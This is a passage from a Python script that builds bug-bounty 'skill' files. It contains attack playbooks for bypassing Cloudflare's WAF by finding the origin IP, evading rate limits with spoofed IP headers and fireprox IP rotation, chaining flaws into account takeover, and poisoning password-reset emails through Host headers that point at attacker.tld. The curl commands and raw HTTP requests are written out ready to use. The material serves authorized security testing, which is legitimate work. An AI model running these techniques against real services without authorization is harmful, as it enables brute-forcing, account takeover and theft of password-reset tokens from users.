"triage": "Show WAF block, then your bypassed payload landing.",
"severity": "Same as the underlying bug.",
"refs": "Bypassing Cloudflare WAF in Bug Bounty Programs (uploaded) • PortSwigger WAF research"
},

"cloudflare_bypass.md": {
"title": "Cloudflare Bypass — Origin IP + WAF",
"identity": "Two angles: find origin IP (best, total bypass) or beat the WAF rules (fragile).",
"detection": "`Server: cloudflare`, `cf-ray`, cookies `__cf_bm`, `__cfuid`.",
"exploitation": """### Origin discovery
1. SecurityTrails historical A records for the apex.
2. Cert SAN match on Shodan/Censys outside CF ranges (`ssl:\"target.com\" -country:US -org:cloudflare`).
3. Favicon hash match outside CF ranges.
4. MX records (mail server often sits next to web origin).
5. `dnsdumpster`, `viewdns reverse-IP`.
6. Subdomain hosting on third-party PaaS that doesn't use CF (e.g., Heroku) often shares same backend cluster IP block.
7. SSRF on the target itself reveals internal IP via error pages.
8. `ssl-cert-grabber-by-asn` (find cert hosted on AWS/GCP IP that was once target's).

### Once IP is found
Add `Host:` header override:
```bash
curl -sk --resolve target.com:443:<ORIGIN_IP> https://target.com/
```
or
```bash
curl -sk -H \"Host: target.com\" https://<ORIGIN_IP>/
```

### Cloudflare WAF rule bypass (when you can't find origin)
- HTML5 events not in default ruleset (`<svg/onload>`, `<details ontoggle>`)
- Inline event payload split via newline
- Fragmentation across body
- Multipart with file body containing payload + Content-Type confusion
- HTTP/2 smuggling
- 0x0c null byte / unicode whitespace in payload
- Empty body POST with payload in header (X-Forwarded-For SQLi etc.)
- WebSocket upgrade then send arbitrary content""",
"payloads": "(see PAYLOADS/waf_bypass_payloads.md)",
"bypasses": "(see exploitation)",
"chain": "Origin IP discovery → bypass all WAF rules globally for this engagement.",
"tools": "CloudFail, ip-locator, cloudflare-resolver, fav-up",
"commands": """```bash
python3 CloudFail.py -t target.com
fav-up -u target.com
```""",
"edge": "Some targets force connection through CF via mTLS — origin won't accept direct.",
"triage": "Show direct origin response with target content.",
"severity": "Same as underlying bug + fact that WAF was bypassed.",
"refs": "Bypassing Cloudflare WAF in Bug Bounty Programs (uploaded) • Christian Haschek's articles"
},

"rate_limiting_bypass.md": {
"title": "Rate-Limiting Bypass",
"identity": "Without rate-limit, brute force OTP / login / coupon / 2FA / reset flows = ATO. I exhaust every header / IP rotation / parallel route.",
"detection": "Hit endpoint 100× fast — does it block? After how many?",
"exploitation": """### Headers that some APIs honor as the source IP
```
X-Forwarded-For: 1.2.3.4
X-Real-IP: 1.2.3.4
X-Originating-IP: 1.2.3.4
X-Remote-IP: 1.2.3.4
X-Remote-Addr: 1.2.3.4
X-ProxyUser-Ip: 1.2.3.4
True-Client-IP: 1.2.3.4
Cluster-Client-IP: 1.2.3.4
CF-Connecting-IP: 1.2.3.4
Forwarded: for=1.2.3.4
X-Original-URL: /endpoint/x
X-Rewrite-URL: /endpoint/x
```

Rotate value per request via Burp Intruder / Turbo Intruder.

### Path tricks
- `/api/login` → `/api/login/`, `/api/login//`, `/api//login`, `/api/./login`
- `/api/login?x=1`, `/api/login;a=b`

### Method swap
- POST → PUT/PATCH (some rate-limit only on POST)

### Different region/host
- `-H \"Host: api.target.com\"` vs `target.com/api`

### Content-Type swap
- form vs JSON vs XML

### Distributed (multi-IP)
- Use cloud functions / fly.io / fastly compute / VPS pool — each gets fresh IP.

### Race condition / single-packet attack
- 50 parallel reqs may all pass before counter increments.""",
"payloads": "(see headers above)",
"bypasses": "(see exploitation)",
"chain": "Rate-limit bypass → OTP brute → ATO; coupon brute → financial; 2FA brute → ATO.",
"tools": "Turbo Intruder, fireprox (AWS API Gateway IP rotation), proxychains",
"commands": """```bash
# fireprox creates AWS API Gateway proxy = IP rotation per request
python3 fireprox.py --command create --url https://target.com/api/login --region us-east-1 --profile_name default
# then send your brute through https://....execute-api.us-east-1.amazonaws.com/fireprox/api/login
```""",
"edge": "Account-level rate limits (per user, not IP) cannot be IP-bypassed. Must rotate accounts.",
"triage": "Show 1000 requests in N minutes succeeding (proves bypass).",
"severity": "Depends on chained bug.",
"refs": "ustayready/fireprox • PortSwigger Brute Force"
},

"account_takeover_chains.md": {
"title": "Account Takeover (ATO) Chains",
"identity": "ATO is the impact, not the bug. I chain XSS / IDOR / OAuth / 2FA / password reset / email change / session fixation into ATO.",
"detection": "(map every modify-account endpoint and chain)",
"exploitation": """### Email change → password reset
1. XSS / CSRF → POST /api/email/change `attacker@tld`.
2. Forgot password → reset link to attacker@tld.
3. Login as victim.

### Password reset token in email subject (URL leak via Referer)
1. Find external img link in reset email page.
2. Token leaks via Referer to attacker domain.

### OAuth account merge squatting
1. Pre-create account using `victim@target.com` via Google sign-in (no email verification).
2. Victim later signs up with same email → accounts merged.

### 2FA bypass + password reset
1. Bypass 2FA (see 2fa_mfa_bypass.md).
2. Use password reset.

### Session fixation
1. Force victim to use attacker's session ID (CSRF login).
2. Attacker has same session.

### Cookie scope abuse
1. Subdomain takeover or XSS on related sub gives access to parent-domain cookies.

### Cross-account bleed via 'reset by phone'
1. Change phone number to attacker's via missing-MFA endpoint.
2. SMS OTP reset.""",
"payloads": "(behavior chains)",
"bypasses": "(see component skills)",
"chain": "End → ATO.",
"tools": "Burp Repeater + state diagram",
"commands": "Manual",
"edge": "Triagers want literal account ATO PoC: log in as victim, see their data.",
"triage": "Show login dashboard of victim, with timestamp matching exploit.",
"severity": "9.0+.",
"refs": "bb_kb/Account_Takeover/"
},

"host_header_attacks.md": {
"title": "Host Header Attacks (Password reset poisoning, Cache key, Routing bypass)",
"identity": "Apps trust `Host:` for URL building. Inject attacker's domain → password reset link points at attacker.tld → ATO.",
"detection": "Trigger password reset; intercept; modify `Host:` header to attacker.tld; observe email link.",
"exploitation": """### Reset poisoning
```http
POST /api/forgot HTTP/1.1
Host: attacker.tld
{\"email\":\"victim@target.com\"}
```
Email link: `https://attacker.tld/reset?token=...`. Victim clicks → token sent to attacker.

### X-Forwarded-Host variant
```http
Host: target.com
X-Forwarded-Host: attacker.tld
```

### Routing bypass
```http
Host: admin.internal.target.com
```
If front-end routes by Host, you can hit internal vhosts.

### Cache poisoning
See cache_poisoning.md.""",
"payloads": "(see above)",
"bypasses": "Some apps have allow-list — bypass via subdomain CNAME you control + Host header containing both.",
"chain": "Host injection → reset poisoning → ATO.",
"tools": "Burp Repeater",
"commands": "Burp",
"edge": "Modern frameworks use ALLOWED_HOSTS; misconfig still common.",
"triage": "Show end-to-end ATO via the poisoned reset email.",
"severity": "8.5+.",
"refs": "PortSwigger Host Header Attacks • Skeletor's Host header writeup"
},

}

for fname, data in VULNS.items():
    body = TEMPLATE.format(
        title=data["title"],
        title_lower=data["title"].lower(),
        identity=data["identity"],
        detection=data["detection"],
        exploitation=data["exploitation"],
        payloads=data["payloads"],
        bypasses=data["bypasses"],
        chain=data["chain"],
        tools=data["tools"],
        commands=data["commands"],
        edge=data["edge"],
        triage=data["triage"],
        severity=data["severity"],
        refs=data["refs"],
    )
    (OUT / fname).write_text(body)
    print(f"wrote {fname} ({len(body)} chars)")

print(f"\nTotal in {OUT}: {len(list(OUT.glob('*.md')))}")
